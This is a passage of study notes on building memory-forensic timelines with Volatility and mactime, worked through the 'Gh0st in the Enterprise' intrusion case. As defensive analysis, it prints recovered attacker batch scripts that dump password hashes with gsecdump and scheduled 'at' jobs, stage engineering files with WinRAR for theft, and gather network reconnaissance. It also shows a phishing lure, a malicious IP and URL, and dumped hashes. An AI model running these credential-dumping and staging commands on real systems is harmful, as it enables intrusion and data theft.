## 1. timestamp formats
- `WinTimeStamp`:
	- aka. `FILETIME`
	- 8-byte timestamp
	- number of 100 nanosecond intervals since January 1st, 1601 UTC
	- most commonly used
- `UnixTimeStamp`:
	- 4-byte timestamp
	- number of seconds since Jan 1st, 1970 UTC
- `DosDate`:
	- 4-byte timestamp
	- used to store data and time information in MS-DOS files

## 2. timestamp sources
- system time
- process start/end time
- thread start/end time
- Internet history URL access time
- symbolic link creation time
- Registry key last-write time
- MFT entry timestamp
- UserAssist time
- process working set trim time
- PE file compile time
- library load time
- socket and connection creation time
- event log creation time
- Shimcache record time

## 3. `timeliner` plugin
- default invokation extracts most temporal artifacts
- creating timeline example:
	``` sh
	$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 timeliner --output-file=timeliner.txt --output=body
	$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 mftparser --output-file=mft.txt --output=body
	$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 shellbags --output-file=shellbags.txt --output=body
	$ cat *.txt >> largetimeline.txt
	```
- to include temporal data from alternate sources, run programs such as *log2timeline* against disk image or dumped files
- event log timeline using *log2timeline*:
	``` sh
	$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 dumpfiles -i -r evtx$ -D EVTX_OUTPUT
	$ find EVTX_OUTPUT -exec log2timeline -z UTC -f evtx '{}' -name Win7x64 -w evtx.body \;
	```
	- `-z` specifies time zone
	- `-f` specifies file type
	- `-name` differentiates between machines or sources
	- `w` output file

## 4. `timeliner` output formats
- `text`: 
	- pipe-delimited output
	- format: `Date/Time | Type | Details`
- `xlsx`: columns are `Time | Type | Item | Details | Reason`
- `body`: 
	- output compatible with *mactime* from TSK
	- useful for combining timelines from different sources into one large timeline
- `xml`: output compatible with *Simile data-visualization framework* by MIT

## 5. processing timelines using *mactime*
- example output:
	``` data
	$ mactime –b timeline.body –d –z UTC
	Tue Nov 27 2012 01:45:46,336,macb,,0,0,12038,[MFT FILE_NAME] mdd.exe (Offset: 0x46c800)
	Tue Nov 27 2012 01:45:46,336,.acb,,0,0,12038,[MFT STD_INFO] mdd.exe (Offset: 0x46c800)
	Tue Nov 27 2012 01:45:51,0,m...,,0,0,0,[THREAD] lsass.exe PID: 696/TID: 1768
	[snip]
	```
	- `-b` specifies body file
	- `-d` makes output comma delimited
	- `-z` specifies time zone
	- objects only found in memory have at most 2 timestamps, creation time and exit time; creation time denoted as `.acb` and exit time denoted as `m...`

## 6. analysis starting point
- Prefetch files:
	- execution of malware results in Prefetch file
	- some Windows versions disable Prefetch by default
- Shimcache registry keys:
	- show when programs were executed
	- good backup in case Prefetch is disabled
- creation of unknown executables
- network activity
- Job files:
	- attackers often create Job files to run programs
	- often named *AT#.job*
- Registry keys

## 7. Gh0st in the Enterprise background
- scenario:
	- organization is victim of targeted attack
	- attackers moving laterally between multiple machines
	- investigation started because IDS alert flagged traffic from internal host `ENG-USTXHOU-148` to IP associated with targeted attacks (`58[.]64[.]132[.]141`)
- machines analyzed:
	- `ENG-USTXHOU-148`:172.16.150.20 / WinXPSP3x86
	- `FLD-SARIYADH-43`: 172.16.223.187 / WinXPSP3x86
	- `IIS-SARIYADH-03`: 172.16.223.47 / Win2003SP0x86
- additional data: *jackcr-challenge.pcap*

## 7. Gh0st in the Enterprise setup
1. extract temporal artifacts and generate timeline:
	``` sh
	$ python vol.py –f IIS-SARIYADH-03/memdump.bin
		mftparser --profile=Win2003SP0x86
		--output=body -D IIS_FILES --machine=IIS
		--output-file=challenge/IIS_mft.body
	$ python vol.py –f IIS-SARIYADH-03/memdump.bin
		timeliner --profile=Win2003SP0x86
		--output=body --machine=IIS
		--output-file=challenge/IIS_timeliner.body
	$ python vol.py –f IIS-SARIYADH-03/memdump.bin
		shellbags --profile=Win2003SP0x86
		--output=body --machine=IIS
		--output-file=challenge/IIS_shellbags.body
	```
	- `--machine` used to denote machine
2. extract memory-resident registry hives and parse with `timeline.py`:
	``` sh
	for j in FLD-SARIYADH-43 ENG-USTXHOU-148
	do
		file=challenge/$j/memdump.bin
		loc=challenge/REG/$j
		short=`echo $j |cut -d\- -f1`
		mkdir -p $loc
		for i in config.system config.security config.sam config.default config.software ntuser.dat usrclass.dat
		do
			echo python vol.py -f $file dumpfiles -i -r $i\$ -D $loc
			python vol.py -f $file dumpfiles -i -r $i\$ -D $loc
		done
		find $loc -type f -exec python timeline.py --body '{}' >> $loc.temp \;
		cat $loc.temp |sed "s/\[Registry None/\[$short Registry/" >> $loc.registry.body
		rm $loc.temp
	done
	```
	- loop through each registry filename and dump using `dumpfiles`
	- create registry timelines using dumped files
3. add packet captured data:
	``` sh
	$ log2timeline -f pcap -z UTC jackcr-challenge.pcap -w pcap.body
	```
4. merge timeline files:
	``` sh
	$ cat ENG*.body REG/ENG*.body >> ENG_all
	$ cat IIS*.body REG/IIS*.body >> IIS_all
	$ cat FLD*.body REG/FLD*.body >> FLD_all
	```

## 8. Gh0st in the Enterprise investigation
1. finding initial infection vector:
	- `connscan` plugin on `ENG-USTXHOU-148`:
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin connscan
		Volatility Foundation Volatility Framework 2.4
		Offset(P) Local Address Remote Address Pid
		---------- ------------------------- ------------------------- ---
		0x01f60850 0.0.0.0:0 1.0.0.0:0 36569092
		0x01ffa850 172.16.150.20:1291 58.64.132.141:80 1024
		0x0201f850 172.16.150.20:1292 172.16.150.10:445 4
		0x02084e68 172.16.150.20:1281 172.16.150.10:389 628
		0x020f8988 172.16.150.20:2862 172.16.150.10:135 696
		0x02201008 172.16.150.20:1280 172.16.150.10:389 628
		0x18615850 172.16.150.20:1292 172.16.150.10:445 4
		0x189e8850 172.16.150.20:1291 58.64.132.141:80 1024
		[snip]
		```
		- malicious IP found
	- find Prefetch files:
		``` data
		$ grep -i pf ENG_all | grep -i exe | cut -d\| -f2
		[snip]
		[MFT FILE_NAME] WINDOWS\Prefetch\NET.EXE-01A53C2F.pf (Offset: 0x12d588)
		[MFT FILE_NAME] WINDOWS\Prefetch\SL.EXE-010E2A23.pf (Offset: 0x311400)
		[MFT FILE_NAME] WINDOWS\Prefetch\GS.EXE-3796DDD9.pf (Offset: 0x311800)
		[MFT FILE_NAME] WINDOWS\Prefetch\PING.EXE-31216D26.pf (Offset: 0x311c00)
		[MFT FILE_NAME] WINDOWS\Prefetch\PS.EXE-09745CC1.pf (Offset: 0x924e400)
		[MFT FILE_NAME] WINDOWS\Prefetch\AT.EXE-2770DD18.pf (Offset: 0x12ab2400)
		[MFT FILE_NAME] WINDOWS\Prefetch\WC.EXE-06BFE764.pf (Offset: 0x12ab2c00)
		[MFT FILE_NAME] WINDOWS\Prefetch\SYMANTEC-1.43-1[2].EXE-3793B625.pf (Offset: 0x17779800)
		```
		- suspicious exe file *SYMANTEC-1.43-1[2].EXE* found
		- indications of network reconnaissance found
	- search timeline for `symantec`:
		``` data
		$ mactime -b ENG_all -d -z UTC
		[snip]
		Mon Nov 26 2012 23:01:53,macb,[ENG IEHISTORY] explorer.exe->Visited: callb@http://58.64.132.8/download/Symantec-1.43-1.exe PID: 284/Cache type "URL " at 0x2895000
		[snip]
		Mon Nov 26 2012 23:01:54,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch\SYMANTEC-1.43-1[2].EXE-3793B625.pf (Offset: 0x17779800)
		```
		- confirms executable file was downloaded
	- use *strings* to search for `symantec` download URL:
		``` data
		to install this anti-virus may result in loosing your job!
		Please donwload at http://58.64.132.8/download/Symantec-1.43-1.exe
		Regards,
		The IS Department
		```
		- phishing email was sent to machine
	- suspicious registry change found in close temporal proximity to `symantec`:
		``` data
		Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] $$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4
		Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] $$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4\0000
		Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] $$$PROTO.HIV\ControlSet001\Services\6to4\Parameters
		Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] $$$PROTO.HIV\ControlSet001\Services\6to4\Security
		```
	- `printkey` plugin to view key contents:
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey -K "ControlSet001\Services\6to4"
		Volatility Foundation Volatility Framework 2.4
		Legend: (S) = Stable (V) = Volatile
		----------------------------
		Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
		Key name: 6to4 (S)
		Last updated: 2012-11-26 23:01:55 UTC+0000
		Subkeys:
		(S) Parameters
		(S) Security
		(V) Enum
		Values:
		REG_DWORD Type : (S) 288
		REG_DWORD Start : (S) 2
		REG_DWORD ErrorControl : (S) 1
		REG_EXPAND_SZ ImagePath : (S) %SystemRoot%\System32\svchost.exe -k netsvcs
		REG_SZ DisplayName : (S) Microsoft Device Manager
		REG_SZ ObjectName : (S) LocalSystem
		REG_SZ Description : (S) Service Description
		```
		- service is run inside *svchost.exe*
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey
		-K "ControlSet001\Services\6to4\Parameters"
		Volatility Foundation Volatility Framework 2.4
		Legend: (S) = Stable (V) = Volatile
		----------------------------
		Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
		Key name: Parameters (S)
		Last updated: 2012-11-26 23:01:54 UTC+0000
		Subkeys:
		Values:
		REG_EXPAND_SZ ServiceDll : (S) C:\WINDOWS\system32\6to4ex.dll
		```
		- can see dll being used for service
	- *svchost.exe* threads were started after service was created:
		``` data
		Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 276
		Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 508
		Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 528
		Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 536
		Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 652
		Mon Nov 26 2012 23:01:54,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 936
		```
		- same PID that was communicating with malicious IP
	- view loaded dlls for PID 1024 using `dlllist`:
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin dlllist -p 1024
		Volatility Foundation Volatility Framework 2.4
		************************************************************************
		svchost.exe pid: 1024
		Command line : C:\WINDOWS\System32\svchost.exe -k netsvcs
		Service Pack 3
		Base Size LoadCount Path
		---------- ---------- ---------- ----
		0x01000000 0x6000 0xffff C:\WINDOWS\System32\svchost.exe
		0x7c900000 0xaf000 0xffff C:\WINDOWS\system32\ntdll.dll
		[snip]
		0x10000000 0x1c000 0x1 c:\windows\system32\6to4ex.dll
		[snip]
		```
		- suspicious dll is loaded
	- `svcscan` for additional information:
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin svcscan
		[snip]
		Offset: 0x389d60
		Order: 228
		Process ID: 1024
		Service Name: 6to4
		Display Name: Microsoft Device Manager
		Service Type: SERVICE_WIN32_SHARE_PROCESS
		Service State: SERVICE_RUNNING
		Binary Path: C:\WINDOWS\System32\svchost.exe -k netsvcs
		[snip]
		```
		- order number should be low; created after system last booted
		- service starts within 1 second of *SYMANTEC-1.43-1[2].EXE*; most likely related
2. finding active attacker
	- searching for artifacts in close temporal proximity, a number of suspicous events are found:
		``` data
		Mon Nov 26 2012 23:03:10,macb,[ENG MFT FILE_NAME] WINDOWS\webui (Offset: 0x1bc21000)
		Mon Nov 26 2012 23:03:21,.a..,[MFT STD_INFO] WINDOWS\system32\ipconfig.exe (Offset: 0xc826400)
		Mon Nov 26 2012 23:06:34,macb,[ENG MFT FILE_NAME] WINDOWS\ps.exe (Offset: 0x15983800)
		[snip]
		Mon Nov 26 2012 23:07:53,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch \NET.EXE-01A53C2F.pf (Offset: 0x12d588)
		```
		- directory named `WINDOWS\webui` appears on system
		- *ipconfig.exe* was accessed
		- another executable *ps.exe* was downloaded
		- Prefetch for *net* was created
	- search for created directory:
		``` data
		$ mactime -b ENG_all -d -z UTC \ | grep -i webui | grep FILE_NAME
		Mon Nov 26 2012 23:06:47,macb,[ENG MFT FILE_NAME] WINDOWS\webui\gs.exe (Offset: 0x16267c00)
		Mon Nov 26 2012 23:06:52,macb,[ENG MFT FILE_NAME] WINDOWS\webui\ra.exe (Offset: 0x17779c00)
		Mon Nov 26 2012 23:06:56,macb,[ENG MFT FILE_NAME] WINDOWS\webui\sl.exe (Offset: 0x1f5ff000)
		Mon Nov 26 2012 23:06:59,macb,[ENG MFT FILE_NAME] WINDOWS\webui\wc.exe (Offset: 0x1f5ff400)
		Mon Nov 26 2012 23:07:31,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netuse.dll (Offset: 0xde4e48)
		Tue Nov 27 2012 00:49:01,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system.dll (Offset: 0x924e800)
		Tue Nov 27 2012 00:57:20,macb,[ENG MFT FILE_NAME] WINDOWS\webui\svchost.dll (Offset: 0x924ec00)
		Tue Nov 27 2012 01:01:39,macb,[ENG MFT FILE_NAME] WINDOWS\webui\https.dll (Offset: 0x109cf7a8)
		Tue Nov 27 2012 01:14:48,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netstat.dll (Offset: 0x10b97400)
		Tue Nov 27 2012 01:26:47,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system5.bat (Offset: 0x10b97800)
		```
		- several other files were created in that directory over subsequent 2 hours
	- artifacts suggesting executables were run can be found:
		``` data
		Mon Nov 26 2012 23:10:35,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch\SL.EXE-010E2A23.pf (Offset: 0x311400)
		Mon Nov 26 2012 23:11:58,.a..,[ENG Registry] SECURITY\Policy\Secrets
		Mon Nov 26 2012 23:11:58,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch\GS.EXE-3796DDD9.pf (Offset: 0x311800)
		```
		- `Policy\Secrets` key accessed with *GS.EXE* execution; suggests *GS.EXE* is accessing *Local Security Authority(LSA)* secrets, used to extract cached password domain hashes
	- `cachedump` to see what password hashes attacker could have accessed:
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin cachedump
		Volatility Foundation Volatility Framework 2.4
		administrator:00c2bcc2230054581d3551a9fdcf4893:petro-market:petro-market.org
		callb:178526e1cb2fdfc36d764595f1ddd0f7:petro-market:petro-market.org
		```
	- extract *GS.EXE* file with `dumpfiles` plugin:
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin filescan | grep -i \\\\gs.exe
		Volatility Foundation Volatility Framework 2.4
		0x020bb938 1 0 R--r-d \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
		0x18571938 1 0 R--r-d \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin dumpfiles -Q 0x020bb938 -D ENG_OUT/
		Volatility Foundation Volatility Framework 2.4
		ImageSectionObject 0x020bb938 \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
		DataSectionObject 0x020bb938 \Device\HarddiskVolume1\WINDOWS\webui\gs.exe
		```
	- *strings* on *GS.EXE*:
		``` data
		$ strings -a file.None.0x822cf6e8.img > gs.strings
		$ strings -a –el file.None.0x822cf6e8.img >> gs.strings
		$ cat gs.strings
		[snip]
		unable to start gsecdump as service
		system
		help
		dump_all,a
		dump all secrets
		dump_hashes,s
		dump hashes from SAM/AD
		dump_lsa,l
		dump lsa secrets
		dump_usedhashes,u
		dump hashes from active logon sessions
		dump_wireless,w
		dump microsoft wireless connections
		help,h
		show help
		system,S
		run as localsystem
		gsecdump v0.7 by Johannes Gumbel (johannes.gumbel@truesec.se)
		usage: gsecdump [options]
		[snip]
		```
		- seems to be *gsecdump* which accesses registry key in a way that changes `LastWriteTime` without changing data
	- temporal proximity search:
		``` data
		Mon Nov 26 2012 23:11:58,.a..,[ENG MFT STD_INFO] WINDOWS\system32\samsrv.dll (Offset: 0x329f000)
		Mon Nov 26 2012 23:11:58,.a..,[ENG MFT STD_INFO] WINDOWS\system32\cryptdll.dll (Offset: 0x3329c00)
		```
		- DLLs often used for dumping password hashes accessed at same time as *GS.EXE* execution
3. mapping remote file shares:
	- artifacts suggest *ping.exe* was executed
		``` data
		Mon Nov 26 2012 23:15:41,.a..,[ENG MFT STD_INFO] WINDOWS\system32\ping.exe (Offset: 0x334dc00)
		Mon Nov 26 2012 23:15:44,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch \PING.EXE-31216D26.pf (Offset: 0x311c00)
		```
	- temporal proximity search:
		``` data
		Tue Nov 27 2012 00:00:54,.a..,[ENG Registry] $$$PROTO.HIV\Software\Sysinternals
		Tue Nov 27 2012 00:00:54,.a..,[ENG Registry] $$$PROTO.HIV\Software\Sysinternals\PsExec
		[snip]
		Tue Nov 27 2012 00:00:57,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch \PS.EXE-09745CC1.pf (Offset: 0x924e400)
		Tue Nov 27 2012 00:07:03,.a..,[ENG MFT STD_INFO] WINDOWS\ps.exe (Offset: 0x15983800)
		Tue Nov 27 2012 00:09:55,.a..,[ENG MFT STD_INFO] WINDOWS\system32\wbem (Offset: 0x3156400)
		Tue Nov 27 2012 00:10:44,mac.,[ENG MFT STD_INFO] WINDOWS\Temp (Offset: 0x3159000)
		Tue Nov 27 2012 00:44:16,m...,[ENG MFT STD_INFO] WINDOWS\webui\system.dll (Offset: 0x924e800)
		```
		- based on registry key changes, *PS.EXE* seems to be *PsExec*
		- *system.dll* was created on machine
	- temporal proximity search:
		``` data
		Tue Nov 27 2012 00:48:19,.a..,[ENG Registry] $$$PROTO.HIV\Network
		Tue Nov 27 2012 00:48:19,macb,[ENG SYMLINK] Z:->\Device\LanmanRedirector\;Z:00000000000003e7\172.16.223.47\z POffset: 185218568/Ptr: 1/Hnd: 0
		Tue Nov 27 2012 00:49:28,.a..,[ENG Registry] $$$PROTO.HIV\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\##172.16.223.47#z
		```
		- `Network` registry key was modified and symbolic link was created; consistent with share being mounted over network
		- when remote drive is mapped, subkey should be created under `Network`
	- view `Network` key for subkey `z`:
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey -K "network\z"
		Volatility Foundation Volatility Framework 2.4
		Legend: (S) = Stable (V) = Volatile
		----------------------------
		Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\default
		Key name: z (S)
		Last updated: 2012-11-27 00:48:20 UTC+0000
		Subkeys:
		Values:
		REG_SZ RemotePath : (S) \\172.16.223.47\z
		REG_SZ UserName : (S) PETRO-MARKET\ENG-USTXHOU-148$
		REG_SZ ProviderName : (S) Microsoft Windows Network
		REG_DWORD ProviderType : (S) 131072 (0x20000)
		REG_DWORD ConnectionType : (S) 1
		REG_DWORD DeferFlags : (S) 4
		```
		- connection was created using *net use* command; `0x20000` for `ProviderType` means LanMan `1` for `ConnectionType` means drive redirection, and `4` for `DeferFlags` mean credentials have been saved
4. scheduled jobs for hash dumping:
	- examine *system5.bat* under suspicious `webui` directory:
		``` data
		$ mactime -b ENG_all -d -z UTC | grep -i webui | grep FILE_NAME
		[snip]
		Tue Nov 27 2012 01:26:47,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system5.bat (Offset: 0x10b97800)
		$ ls ENG_FILES/*0x10b97800*
		file.0x10b97800.data0.dmp
		$ cat ENG_FILES/file.0x10b97800.data0.dmp
		@echo off
		copy c:\windows\webui\wc.exe c:\windows\system32
		at 19:30 wc.exe -e -o h.out
		```
		- file happened to be resident in MFT
		- *at* was used to create a Job
	- search for events immediately after:
		``` data
		Tue Nov 27 2012 01:27:03,macb,[ENG MFT FILE_NAME] WINDOWS\Tasks\At1.job (Offset: 0x12ab2000)
		Tue Nov 27 2012 01:27:03,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch\AT.EXE-2770DD18.pf (Offset: 0x12ab2400)
		```
		- Job file artifacts found
	- related artifacts:
		``` data
		Tue Nov 27 2012 01:30:00,macb,[ENG PROCESS LastTrimTime] wc.exe PID: 364/PPID: 1024/POffset: 0x02049690
		Tue Nov 27 2012 01:30:00,.acb,[ENG PROCESS] wc.exe PID: 364/PPID: 1024/POffset: 0x02049690
		Tue Nov 27 2012 01:30:00,.a..,[ENG Registry] $$$PROTO.HIV\Microsoft\SchedulingAgent
		Tue Nov 27 2012 01:30:00,.acb,[ENG THREAD] csrss.exe PID: 604/TID: 1248
		Tue Nov 27 2012 01:30:00,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 492
		Tue Nov 27 2012 01:30:00,.acb,[ENG THREAD] wc.exe PID: 364/TID: 2004
		Tue Nov 27 2012 01:30:00,.ac.,[ENG MFT STD_INFO] WINDOWS\system32\wc.exe (Offset: 0x10b97c00)
		Tue Nov 27 2012 01:30:00,mac.,[ENG MFT STD_INFO] WINDOWS\Tasks\At1.job (Offset: 0x12ab2000)
		Tue Nov 27 2012 01:30:00,macb,[ENG MFT FILE_NAME] WINDOWS\system32\h.out (Offset: 0x12ab2800)
		Tue Nov 27 2012 01:30:10,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch\WC.EXE-06BFE764.pf (Offset: 0x12ab2c00)
		```
	- view `SchedulingAgent` keys:
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey -K "Microsoft\SchedulingAgent"
		Volatility Foundation Volatility Framework 2.4
		Legend: (S) = Stable (V) = Volatile
		----------------------------
		Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\software
		Key name: SchedulingAgent (S)
		Last updated: 2012-11-27 01:30:00 UTC+0000
		Subkeys:
		Values:
		REG_EXPAND_SZ TasksFolder : (S) %SystemRoot%\Tasks
		REG_EXPAND_SZ LogPath : (S) %SystemRoot%\SchedLgU.Txt
		REG_DWORD MinutesBeforeIdle : (S) 15
		REG_DWORD MaxLogSizeKB : (S) 32
		REG_SZ OldName : (S) ENG-USTXHOU-148
		REG_DWORD DataVersion : (S) 3
		REG_DWORD PriorDataVersion : (S) 0
		REG_BINARY LastTaskRun : (S)
		0x00000000 dc 07 0b 00 01 00 1a 00 13 00 1e 00 01 00 00 00 ................
		```
		- `LastTaskRun` is updated when task runs on system
	- translate time:
		``` python
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin volshell
		Volatility Foundation Volatility Framework 2.4
		[snip]
		>>> import volatility.plugins.registry.registryapi as registryapi
		>>> import jobparser as jobparser
		>>> regapi = registryapi.RegistryApi(self._config)
		>>> dateraw = regapi.reg_get_value(hive_name = "software", key =
		"Microsoft\\SchedulingAgent", value = "LastTaskRun")
		>>> print jobparser.JobDate(dateraw)
		Monday Nov 26 19:30:01.0 2012
		```
	- find local time:
		``` data
		$ python vol.py –f ENG-USTXHOU-148/memdump.bin imageinfo
		Volatility Foundation Volatility Framework 2.4
		[snip]
				Image date and time : 2012-11-27 01:57:28 UTC+0000
			Image local date and time : 2012-11-26 19:57:28 -0600
		```
		- `LastTaskRun` value is consistent with *wc.exe* creation time
	- extract *h.out*:
		``` data
		Tue Nov 27 2012 01:30:00,560,macb,,0,0,11742,[ENG MFT FILE_NAME]
		WINDOWS\system32\h.out (Offset: 0x12ab2800)
		$ ls ENG_FILES/*0x12ab2800*
		ENG_FILES/file.0x12ab2800.data0.dmp
		$ cat ENG_FILES/file.0x12ab2800.data0.dmp
		callb:PETRO-MARKET:115B24322C11908C85140F5D33B6232F:40D1D232D5F731EA966
		913EA458A16E7
		ENG-USTXHOU-148$:PETRO-MARKET:00000000000000000000000000000000:D6717F1E
		5252FA87ED40AF8C46D8B1E2
		sysbackup:current:C2A3915DF2EC79EE73108EB48073ACB7:E7A6F270F1BA562A90E2
		C133A95D2057
		```
		- file was mft resident
		- output resembles password hashes; indication attacker may move laterally
5. overlaying attack artifacts:
	- search for similar exe files on other systems:
		``` data
		$ grep -Hi symantec IIS_all FLD_all | cut -d\| -f1,2
		FLD_all:0|[MFT FILE_NAME] WINDOWS\Prefetch\SYMANTEC-1.43-1[2].EXE-330FB7E3.pf (Offset: 0x1d75cc00)
		```
		- `FLD-SARIYADH-43` system may have been compromised as well
	- view timeline:
		``` data
		Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] $$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4
		Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] $$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4\0000
		Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] $$$PROTO.HIV\ControlSet001\Services\6to4
		Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] $$$PROTO.HIV\ControlSet001\Services\6to4\Parameters
		Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] $$$PROTO.HIV\ControlSet001\Services\6to4\Security
		Tue Nov 27 2012 00:17:58,0,.acb,,0,0,0,[FLD THREAD] svchost.exe PID: 1032/TID: 152
		Tue Nov 27 2012 00:17:58,0,.acb,,0,0,0,[FLD THREAD] svchost.exe PID: 1032/TID: 1920
		```
		- same service was created
		- also followed by creation of *svchost.exe* threads
	- artifacts from `FLD-SARIYADH-43` are very similar:
		- creation of `C:\WINDOWS\webui` with same executables
		- network reconnaissance with *sl.exe*, *gs.exe*, and *wc.exe*
		- execution of *ipconfig.exe* and *net.exe*
		- using of *ps.exe*
	- different batch files were placed:
		``` data
		Tue Nov 27 2012 00:31:39,macb,[FLD MFT FILE_NAME] WINDOWS\system1.bat (Offset: 0x1787f000)
		Tue Nov 27 2012 00:33:32,macb,[FLD MFT FILE_NAME] WINDOWS\Prefetch\PS.EXE-09745CC1.pf (Offset: 0x1787f400)
		Tue Nov 27 2012 00:43:45,macb,[FLD MFT FILE_NAME] WINDOWS\system6.bat (Offset: 0x1787f800)
		Tue Nov 27 2012 00:43:45,macb,[FLD MFT STD_INFO] WINDOWS\system6.bat (Offset: 0x1787f800)
		Tue Nov 27 2012 00:53:29,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system2.bat (Offset: 0x1787fc00)
		Tue Nov 27 2012 00:59:00,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system3.bat (Offset: 0x1b773000)
		Tue Nov 27 2012 01:04:59,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system4.bat (Offset: 0x1b773400)
		Tue Nov 27 2012 01:19:41,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system5.bat (Offset: 0x1b773800)
		```
	- view *system1.bat*:
		``` data
		$ cat file.0x1787f000.data0.dmp
		@echo off
		mkdir c:\windows\webui
		net share z=c:\windows\webui /GRANT:sysbackup,FULL
		```
		- sets up `C:\WINDOWS\webui` as network share
	- view *system6.bat*:
		``` data
		$ cat file.0x1787f800.data0.dmp
		@echo off
		ipconfig /all >> c:\windows\webui\system.dll
		net share >> c:\windows\webui\system.dll
		net start >> c:\windows\webui\system.dll
		net view >> c:\windows\webui\system.dll
		```
		- collects network informatio about this machine
		- saves output into fake *system.dll* file
	- view *system2.bat*:
		``` data
		$ cat file.0x1787fc00.data0.dmp
		@echo off
		c:\windows\webui\gs.exe -a >> c:\windows\webui\svchost.dll
		```
		- runs *gs.exe*, hash-dumping utility
		- dumps output to fake *svchost.dll*
	- view *system3.bat*:
		``` data
		$ cat file.0x1b773000.data0.dmp
		@echo off
		dir /S C:\*.dwg > c:\windows\webui\https.dll
		```
		- generates file listing for all files with *.dwg* extension, commonly used for AutoCAD drawing files 
		- output is saved to fake *https.dll*
	- view *system4.bat*:
		``` data
		$ cat file.0x1b773400.data0.dmp
		@echo off
		c:\windows\webui\ra.exe a -hphclllsddlsdiddklljh -r
		c:\windows\webui\netstat.dll "C:\Engineering\Designs\Pumps" -x*.dll
		```
		- seems to use WinRAR to copy, compress, and encrypt files found in `C:\Engineering\Designs\` containing "Pumps"
	- view *system5.bat*:
		``` data
		$ cat file.0x1b773800.data0.dmp
		@echo off
		copy c:\windows\webui\wc.exe c:\windows\system32
		at 04:30 wc.exe -e -o h.out
		```
		- same as batch file recovered from earlier machine
	- check timeline:
		``` data
		Tue Nov 27 2012 00:46:10,0,.a..,[FLD Registry] $$$PROTO.HIV\Network\z
		Tue Nov 27 2012 00:46:10,0,macb,[FLD SYMLINK] Z:->\Device\LanmanRedirector\;Z:00000000000003e7\172.16.223.47\z POffset: 284628328/Ptr: 1/Hnd: 0
		```
		- around batch file creation time, attacker connects to `IIS-SARIYADH-03` machine
	- temporal proximity search:
		``` data
		Tue Nov 27 2012 01:21:18,616,macb,[FLD MFT FILE_NAME] WINDOWS\Tasks\At1.job (Offset: 0x1af18000)
		Tue Nov 27 2012 01:21:18,472,macb,[FLD MFT FILE_NAME] WINDOWS\Prefetch\AT.EXE-2770DD18.pf (Offset: 0x1af18400)
		```
		- *system5.bat* was exected using *At1.job*
6. decoding network data:
	- create combined timeline:
		``` sh
		$ cat pcap.body *_all >> combined.body
		$ mactime –b combined.body –d –z UTC
		```
	- temporal proximity search:
		``` data
		Mon Nov 26 2012 23:01:58,0,.acb,,0,0,0,[ENG THREAD] svchost.exe PID: 1024/TID: 804
		Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written)
			<172.16.150.20> TCP SYN packet 172.16.150.20:1097 -> 58.64.132.141:80
			seq [2669490555] (file: jackcr-challenge.pcap)
		Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written)
			<172.16.150.20> TCP packet flags [0x10: ACK ] 172.16.150.20:1097
